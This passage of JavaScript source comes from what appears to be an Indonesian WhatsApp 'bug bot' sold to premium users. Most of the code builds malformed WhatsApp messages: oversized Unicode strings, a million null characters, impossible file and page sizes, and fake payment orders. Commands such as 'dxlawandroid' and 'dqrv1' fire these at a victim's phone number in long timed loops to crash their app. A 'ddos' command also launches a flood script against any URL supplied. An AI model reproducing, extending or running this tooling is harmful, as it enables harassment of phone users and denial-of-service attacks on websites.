                  paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"⿻ CrazyCrash ⿻\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"ꫂۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ".repeat(
                    1020000
                  )}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                  version: 3,
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By Dqr ¿"));
    }

    async function GlxCall(X, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "⿻ CrazyCrash ⿻",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "‎⚝𝐏𝐒𝐓𝐞𝐚𝐦𝐀𝐝𝐦⚝",
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" ⿻ CrazyCrash ⿻ ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"⿻ CrazyCrash ⿻' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"⿻ CrazyCrash ⿻","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "review_and_pay",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "review_and_pay",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_info",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_info",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"⿻ CrazyCrash ⿻","sections":[{"title":"⿻ CrazyCrash ⿻","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"BY DEVORSIXCORE","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: EsQl,
        }
      );

      await PannOfficiaL.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By Dqr ¿"));
    }

    async function GlxCallX(X, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "‎⭑̤▾ ⿻ CrazyCrash ⿻ ▾⭑̤",
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" 𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡😈' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "review_and_pay",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "review_and_pay",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_info",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_info",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡😈","sections":[{"title":"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"BY DEVORSIXCORE","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: VisiX,
        }
      );

      await PannOfficiaL.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By Dqr ¿"));
    }



      //new fuction 

const VxO = "▾⿻⿻▾⭑⃰" + "ꫂۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ".repeat(50000);
    async function NewsletterZap(LockJids) {
      var messageContent = generateWAMessageFromContent(
        LockJids,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: `120363298524333143@newsletter`,
                newsletterName:
                  "⭑̤▾ ⿻ CrazyCrash ⿻ ▾⭑⃰" + "\u0000".repeat(990000),
                jpegThumbnail: "",
                caption: `⚝𝐏𝐒𝐓𝐞𝐚𝐦𝐀𝐝𝐦⚝`,
                inviteExpiration: Date.now() + 1814400000,
              },
            },
          },
        }),
        {
          userJid: LockJids,
        }
      );
      await PannOfficiaL.relayMessage(LockJids, messageContent.message, {
        participant: {
          jid: LockJids,
        },
        messageId: messageContent.key.id,
      });
    }

      const wanted = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      'message': {
        "interactiveMessage": {
          "header": {
            "hasMediaAttachment": true,
            "jpegThumbnail": fs.readFileSync(`./system/image/VR.png`)
          },
          "nativeFlowMessage": {
            "buttons": [{
              "name": "review_and_pay",
              "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐃𝐐𝐫͢ 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
            }]
          }
        }
      }
    }


// BATA FUNCTION //

const ultraviolet = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(m.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./system/image/zkosong.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"ہہ𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    }
const zyn = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2029",
      thumbnail: anjay,
      itemCount: 1,
      status: "INQUIRY",
      surface: "CATALOG",
      message: `${m.body || m.mtype}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: m.sender.split,
    forwardingScore: 999,
    isForwarded: true
  }
};

async function downloadMp3 (link) {
try {
PannOfficiaL.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
PannOfficiaL.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
PannOfficiaL.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
PannOfficiaL.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

//self public
PannOfficiaL.public = true
if (!PannOfficiaL.public) {
if (!isCreator) return
}

const reply = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `𝐙𝐢𝐢𝐱 𝐈𝐬 𝐁𝐚𝐜𝐤`
}}
}

const replyz = (teks) => { 
PannOfficiaL.sendMessage(from, { text: teks, contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `REVISION`,
body: `Welcome ${pushname} ☠️`,
previewType: "VIDEO",
thumbnail: anjay,
sourceUrl: `${global.url}`,
mediaUrl: `${global.url}`
}
},
text: teks
}, {
quoted: m
})
}

const reply2 = (teks) => {
PannOfficiaL.sendMessage(from, { text : teks }, { quoted : m })
}


function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
    temp = ms
    days = Math.floor(ms / (24*60*60*1000));
    daysms = ms % (24*60*60*1000);
    hours = Math.floor((daysms)/(60*60*1000));
    hoursms = ms % (60*60*1000);
    minutes = Math.floor((hoursms)/(60*1000));
    minutesms = ms % (60*1000);
    sec = Math.floor((minutesms)/(1000));
    return days+" Hari "+hours+" Jam "+ minutes + " Menit";
    // +minutes+":"+sec;
  }

// Sayying time
const timee = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(timee < "23:59:00"){
var waktuucapan = 'Selamat Malam 🌃'
}
if(timee < "19:00:00"){
var waktuucapan = 'Selamat Petang 🌆'
}
if(timee < "18:00:00"){
var waktuucapan = 'Selamat Sore 🌅'
}
if(timee < "15:00:00"){
var waktuucapan = 'Selamat Siang 🏙'
}
if(timee < "10:00:00"){
var waktuucapan = 'Selamat Pagi 🌄'
}
if(timee < "05:00:00"){
var waktuucapan = 'Selamat Subuh 🌉'
}
if(timee < "03:00:00"){
var waktuucapan = 'Tengah Malam 🌌'
}


if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('REC.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Maaf, command yang kamu berikan salah. mungkin ini yang kamu maksud:\n\n•> ${prefix+mean}\n•> Kemiripan: ${similarityPercentage}%`
replyz(response)
}}



switch(command) {
case 'menu': {
await loading()
const menu =`
⟬ *REVISION V1.0*  ⟭
𝐎𝐰𝐧 : ${global.namaown}
𝐁𝐨𝐭 : ${global.namabot}
𝐕𝐞𝐫𝐬𝐢 : ${global.versisc}


⟬ *normal bug* ⟭
${global.simbol} .dqrv1
${global.simbol} .oboyz
${global.simbol} .repeat
${global.simbol} .xdqr


⟬ *proprietáriobug*⟭
${global.simbol} .dxlaw-versão 
${global.simbol} .xfracassado 
${global.simbol} .revisão
${global.simbol} .documento
${global.simbol} .mistura
${global.simbol} .dxlawandroid
${global.simbol} .xui


⟬ *DDOS* ⟭
${global.simbol} .ddos <𝘂𝗿𝗹 𝘁𝗶𝗺𝗲 𝗿𝗽𝘀 𝘁𝗵𝗿𝗲𝗮𝗱>
${global.simbol} .checkhost <𝘂𝗿𝗹>


⟬ *RANDOM* ⟭
${global.simbol} .buysc
${global.simbol} .public
${global.simbol} .rvo

> REVISION. 1.0`
await PannOfficiaL.sendMessage(from, { 
image: anjay,
caption: menu,
 mentions:[sender] 
 }, {
  quoted: qkontak
  });
 }
break




case 'ddos': {
if (!isBotRegistered) return replyz(mess.OnlyOwner)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
m.reply(`Sucess Menyerang Website : ${url}, Website akan eror dalam waktu ${time}`);
exec(`node ./lib/anyb.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break

case "checkhost": {
if (!q) return replyz(`Example : ${m.prefix + m.command} https://nxnn.com`)
let msg = { viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": "p"
    },
    "body": {
      "text": "Klik Chech Host Untuk Untuk Memeriksa Web"
    },
    "footer": {
      "text": "Valdez-offc"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": `{ display_text : 'Check Host' , url : "https://check-host.net/check-http?host=${q}", merchant_url : "https://check-host.net/check-http?host=${q}" }`
        }
      ],
      "messageParamsJson": ""
    }
  }
}
}
}
PannOfficiaL.relayMessage(m.chat, msg, {});
}
break

case 'addprem':
if (!isBotRegistered) return replyz(mess.OnlyOwner)
if (!text) return replyz(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
var prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
orgkaya.push(prem1)
fs.writeFileSync('./database/premium.json', JSON.stringify(orgkaya))
replyz(`${prem1} \`Anjayy Di Addprem\``)
await sleep(3500)
PannOfficiaL.sendMessage(prem1 + '@s.whatsapp.net', {
image: { url: 'https://pomf2.lain.la/f/y29d72u.jpg' },
caption: 'Kamu sekarang adalah User Premium!!'
}, { quoted: m })
break

case 'delprem':
if (!isCreator) return replyz(mess.OnlyOwner)
if (!text) return replyz(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = orgkaya.indexOf(prem2)
orgkaya.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(orgkaya))
replyz(`${prem2} \`Awokawok Di Delprem\` `)
break




case "dxlawandroid": case "xui":
        {
          
if (!isPremium) return replyz(mess.premium)
          if (!text)
            return zreply(
              `*Syntax Error!*\n\n_Use : Android Number_\n_Example : dxlawandroid 62xx_\n`
            );
   
          incTarget = text.split("|")[0].replace(/[^0-9]/g, "");
          if (incTarget.startsWith("0"))
            return zreply(
              `*Syntax Error!*\n\n_Use : Android Number_\n_Example : dxlawandroid 62xx_\n`
            );

          let X = incTarget + "@s.whatsapp.net";
          await replyz(mess.bugrespon)
          global.jumlah = text.split("|")[1];
          for (let i = 0; i < 1; i++) {
            await GlX(X, (Ptcp = true));
            await StuckNull(X, GetsuZo, (Ptcp = true));
          }
          for (let i = 0; i < 20; i++) {
            await TrashSystem(X, GetsuZo, (Ptcp = true));
          }
          for (let i = 0; i < 5; i++) {
            0;
            await ClPmNull(X, null, GetsuZo, (cct = true), (ptcp = true));
            await ClPmNull(X, null, GetsuZo, (cct = true), (ptcp = true));
            await ClPmNull(
              X,
              null,
              LIVELOK,
              GetsuZo,
              (cct = true),
              (ptcp = true)
            );
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
          }
          for (let i = 0; i < 2; i++) {
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
          }
          for (let i = 0; i < 5; i++) {
            await ClPmNull(
              X,
              null,
              LIVELOK,
              GetsuZo,
              (cct = true),
              (ptcp = true)
            );
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
          }
          await sleep(15000);
          for (let i = 0; i < 6; i++) {
            await ClPmNull(
              X,
              null,
              LIVELOK,
              GetsuZo,
              (cct = true),
              (ptcp = true)
            );
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
          }
          await sleep(60000);
          for (let i = 0; i < 10; i++) {
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
          }
          await sleep(240000);
          for (let i = 0; i < 300; i++) {
            await ClPmNull(
              X,
              null,
              LIVELOK,
              GetsuZo,
              (cct = true),
              (ptcp = true)
            );
            await sleep(600);
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));

            await sleep(240000);
            for (let i = 0; i < 3; i++)
              await ClPmNull(
                X,
                null,
                LIVELOK,
                GetsuZo,
                (cct = true),
                (ptcp = true)
              );
            await sleep(600);
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));

            await sleep(240000);
            for (let i = 0; i < 3; i++)
              await ClPmNull(
                X,
                null,
                LIVELOK,
                GetsuZo,
                (cct = true),
                (ptcp = true)
              );
            await sleep(600);
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));

            await sleep(240000);
            for (let i = 0; i < 3; i++)
              await ClPmNull(
                X,
                null,
                LIVELOK,
                GetsuZo,
                (cct = true),
                (ptcp = true)
              );
            await sleep(600);
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));

            await sleep(240000);
            for (let i = 0; i < 3; i++)
              await ClPmNull(
                X,
                null,
                LIVELOK,
                GetsuZo,
                (cct = true),
                (ptcp = true)
              );
            await sleep(600);
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));

            await sleep(240000);
            for (let i = 0; i < 3; i++)
              await ClPmNull(
                X,
                null,
                LIVELOK,
                GetsuZo,
                (cct = true),
                (ptcp = true)
              );
            await sleep(600);
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
            await StuckNull(X, LIVELOK, GetsuZo, (Ptcp = true));
          }
          await replyz(mess.donebug);
        }
        break;



case 'xfracassado': case 'dqrv1': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let Pe = peler + '@s.whatsapp.net'
await replyz(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await tiriz(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await sleep(500)
await lawaz(Pe)
await lawaz(Pe)
await lawaz(Pe)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await sleep(1000)
await lawaz(Pe)
await lawaz(Pe)
await ratecrash(Pe)
await locationcrash(Pe, wanted)
await tiriz(Pe, ultraviolet)
await sendSystemCrashMessage(Pe)
await(1500);
await sendSystemCrashMessage(Pe)
await tiriz(Pe, ultraviolet)
await locationcrash(Pe, wanted)
await locationcrash(Pe, wanted)
await tiriz(Pe, ultraviolet)
await ratecrash(Pe)
await(1500);
await sleep(1000)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await lawaz(Pe)
await lawaz(Pe)
